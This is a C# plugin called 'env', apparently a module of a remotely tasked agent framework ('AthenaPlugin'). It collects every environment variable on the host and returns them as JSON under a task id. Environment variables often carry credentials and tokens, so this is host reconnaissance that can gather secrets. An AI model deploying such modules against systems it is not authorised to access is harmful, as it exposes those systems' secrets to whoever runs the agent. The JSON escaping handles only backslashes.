using System;
using System.Collections;
using System.Collections.Generic;
using System.Text;
using PluginBase;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override string Name => "env";
        public override void Execute(Dictionary<string, object> args)
        {
            StringBuilder output = new StringBuilder();
            output.Append("[");
            foreach (DictionaryEntry fs in Environment.GetEnvironmentVariables())
            {

                output.Append($"{{\"Name\":\"{fs.Key.ToString().Replace(@"\", @"\\")}\",\"Value\":\"{fs.Value.ToString().Replace(@"\", @"\\")}\"}}" + ","); // Get values in JSON styling and escape \
            }
            output.Remove(output.Length - 1, 1); // remove extra Comma
            output.Append("]"); // add ending array


            PluginHandler.Write(output.ToString(), (string)args["task-id"], true);
            return;
        }
    }
}
